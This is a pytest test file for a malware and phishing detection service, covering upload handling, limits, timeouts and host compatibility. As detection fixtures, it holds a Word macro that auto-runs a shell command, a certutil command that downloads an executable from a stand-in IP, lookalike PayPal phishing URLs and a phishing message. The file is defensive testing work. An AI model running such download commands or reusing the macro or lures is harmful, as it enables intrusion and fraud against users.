"""ScanService (web request wrapper) and host compatibility of the detection package."""
from __future__ import annotations

import json
import sys
import threading
import time
import types

import pytest

import detection.service as service_module
from detection.engine import inspect_content
from detection.host import core_content_findings, host_capabilities, resolve_host_settings
from detection.service import ScanLimits, ScanService
from detection_fixtures import BENIGN_PDF_OBJECTS, make_docx, make_pdf, make_vba_project, make_zip

MACRO_DOC = make_docx(extra={"word/vbaProject.bin": make_vba_project(
    'Attribute VB_Name = "M"\r\nSub AutoOpen()\r\nShell "cmd /c calc"\r\nEnd Sub\r\n')})


# --- envelopes and admission -----------------------------------------------------------------

@pytest.mark.parametrize("isolation", ["thread", "process"])
def test_inspect_upload_returns_json_envelope(isolation):
    svc = ScanService(ScanLimits(timeout_seconds=60), isolation=isolation)
    envelope = svc.inspect_upload(MACRO_DOC, "../Invoice.docm")
    json.dumps(envelope)
    assert envelope["status"] == "ok", envelope["error"]
    assert envelope["result"]["classification"] == "SUSPICIOUS"
    assert envelope["engine"]["isolation"] == isolation
    assert ScanService.http_status(envelope) == 200


def test_full_upload_and_text_paths():
    svc = ScanService(isolation="thread")
    upload = svc.analyze_upload(make_pdf(BENIGN_PDF_OBJECTS), "notes.pdf", {"ml_analysis": False})
    assert upload["status"] == "ok" and upload["result"]["target"] == "notes.pdf"
    text = svc.analyze_text("http://paypal-secure-login.com/webscr")
    assert text["status"] == "ok" and text["result"]["classification"] == "SUSPICIOUS"


@pytest.mark.parametrize("data,code,http", [(b"", "empty_input", 400), (b"x" * 101, "too_large", 413), ("text", "empty_input", 400)])
def test_inadmissible_uploads_are_rejected_before_parsing(data, code, http):
    envelope = ScanService(ScanLimits(max_bytes=100), isolation="thread").inspect_upload(data, "a.bin")
    assert envelope["status"] == "rejected" and envelope["error"]["code"] == code
    assert ScanService.http_status(envelope) == http


def test_host_size_limit_maps_to_rejected():
    envelope = ScanService(isolation="thread").analyze_upload(b"x" * 101, "a.bin", {"maximum_file_size": 100})
    assert envelope["status"] == "rejected"


def test_text_limits():
    svc = ScanService(ScanLimits(max_text_chars=10), isolation="thread")
    assert svc.analyze_text("   ")["status"] == "rejected"
    assert svc.analyze_text("x" * 11)["error"]["code"] == "too_large"


def test_unexpected_exception_becomes_error_envelope(monkeypatch):
    def boom(*_args):
        raise RuntimeError("parser exploded")
    monkeypatch.setitem(service_module._OPERATIONS, "inspect", boom)
    envelope = ScanService(isolation="thread").inspect_upload(b"abc", "a.txt")
    assert envelope["status"] == "error" and "parser exploded" in envelope["error"]["message"]
    assert ScanService.http_status(envelope) == 500


# --- timeouts and concurrency ---------------------------------------------------------------------

def test_thread_timeout_returns_on_time_and_keeps_slot_until_work_ends(monkeypatch):
    release = threading.Event()

    def slow(*_args):
        release.wait(10)
        return {"done": True}

    monkeypatch.setitem(service_module._OPERATIONS, "inspect", slow)
    svc = ScanService(ScanLimits(timeout_seconds=0.2, max_concurrency=1, queue_timeout_seconds=0.05), isolation="thread")
    started = time.monotonic()
    assert svc.inspect_upload(b"abc", "a.txt")["status"] == "timeout"
    assert time.monotonic() - started < 2
    # The timed-out work is still running, so a second request must not start more work.
    busy = svc.inspect_upload(b"abc", "a.txt")
    assert busy["status"] == "busy" and ScanService.http_status(busy) == 503
    release.set()
    time.sleep(0.2)
    monkeypatch.setitem(service_module._OPERATIONS, "inspect", lambda *_a: {"done": True})
    assert svc.inspect_upload(b"abc", "a.txt")["status"] == "ok"


def test_process_timeout_kills_the_worker():
    svc = ScanService(ScanLimits(timeout_seconds=0.001), isolation="process")  # shorter than process start-up
    envelope = svc.inspect_upload(b"hello", "a.txt")
    assert envelope["status"] == "timeout" and ScanService.http_status(envelope) == 504
    assert svc._slots.acquire(blocking=False)  # slot was released
    svc._slots.release()


def test_concurrent_requests_all_complete():
    svc = ScanService(ScanLimits(max_concurrency=2, queue_timeout_seconds=30), isolation="thread")
    payloads = [MACRO_DOC, make_pdf(BENIGN_PDF_OBJECTS), make_zip({"a.txt": b"hi"}), b"plain text"] * 3
    results: list[dict] = [None] * len(payloads)  # type: ignore[list-item]

    def run(index: int) -> None:
        results[index] = svc.inspect_upload(payloads[index], f"f{index}")

    threads = [threading.Thread(target=run, args=(i,)) for i in range(len(payloads))]
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join(60)
    assert all(result and result["status"] == "ok" for result in results)
    assert [r["result"]["classification"] for r in results[:4]] == ["SUSPICIOUS", "SAFE", "SAFE", "SAFE"]


def test_describe_lists_formats_and_host():
    info = ScanService(isolation="thread").describe()
    json.dumps(info)
    assert "pdf" in info["supported_formats"] and info["host"]["heuristic_engine"] == "content-aware"


def test_auto_isolation_uses_threads_on_lambda(monkeypatch):
    monkeypatch.setenv("AWS_LAMBDA_FUNCTION_NAME", "cyberscan")
    monkeypatch.delenv("CYBERSCAN_ISOLATION", raising=False)
    assert ScanService().isolation == "thread"


# --- host compatibility (the website checkout's core/config differ from this one) ------------------

def test_works_with_host_heuristics_without_scan_content(monkeypatch):
    import core.heuristic_engine as heuristic_engine

    def old_signature(target, file_name=None):
        return {"score": 25, "findings": [{"label": "Legacy rule", "severity": "low", "contribution": 25, "explanation": "x"}]}

    monkeypatch.setattr(heuristic_engine, "evaluate_heuristics", old_signature)
    assert core_content_findings("anything")[0]["label"] == "Legacy rule"
    result = inspect_content(make_zip({"run.ps1": b"certutil -urlcache -f http://203.0.113.9/a a.exe"}), "a.zip")
    assert result["analyzer_errors"] == []
    assert any("certutil" in item.label for item in result["indicators"])


def test_settings_fallback_when_host_config_lacks_resolve_settings(monkeypatch):
    fake = types.ModuleType("config")
    fake.DEFAULT_SETTINGS = {"ml_analysis": True}
    monkeypatch.setitem(sys.modules, "config", fake)
    settings = resolve_host_settings({"ml_analysis": False})
    assert settings == {"ml_analysis": False, "maximum_file_size": 50 * 1024 * 1024}


def test_host_capabilities_report():
    report = host_capabilities()
    assert report["file_analyzer"] == "available" and report["scanner"] == "available"


# --- verdict shaping on hosts whose analyzer predates detection/ ---------------------------------

def test_upload_on_host_without_content_inspection_still_inspects(monkeypatch):
    import core.file_analyzer as file_analyzer
    from detection.engine import analyze_upload

    def legacy_analyze_file(path, settings=None):  # the website's analyzer: own vocabulary, no content_analysis
        return {"target": path, "classification": "NO_INDICATORS_OBSERVED", "combined_score": 0}

    monkeypatch.setattr(file_analyzer, "analyze_file", legacy_analyze_file)
    payload = analyze_upload(MACRO_DOC, "Invoice.docm")
    assert payload["classification"] == "NO_INDICATORS_OBSERVED"          # host field untouched
    assert payload["content_analysis"]["classification"] == "SUSPICIOUS"
    assert payload["detection_summary"]["classification"] == "SUSPICIOUS"
    assert payload["detection_summary"]["needs_attention"] is True


def test_text_on_host_without_content_inspection(monkeypatch):
    import core.scanner as scanner
    from detection.engine import analyze_text_json

    monkeypatch.setattr(scanner, "scan_target", lambda value, is_file=False, settings=None: {"classification": "REVIEW"})
    url = analyze_text_json("http://paypa1.com/login")
    assert url["content_analysis"]["impersonated_brand"] == "paypal"
    message = analyze_text_json("URGENT: your account is suspended. Send us the verification code you received.")
    assert message["detection_summary"]["content_classification"] == "SUSPICIOUS"


@pytest.mark.parametrize("host,content,expected,attention", [
    ("SAFE", "SAFE", "SAFE", False), ("NO_INDICATORS_OBSERVED", "SUSPICIOUS", "SUSPICIOUS", True),
    ("REVIEW", "SAFE", "REVIEW", True), ("SUSPICIOUS", "UNKNOWN", "SUSPICIOUS", True),
])
def test_detection_summary_only_raises_concern(host, content, expected, attention):
    from detection.engine import detection_summary
    summary = detection_summary({"classification": host, "content_analysis": {"classification": content}})
    assert summary["classification"] == expected and summary["needs_attention"] is attention
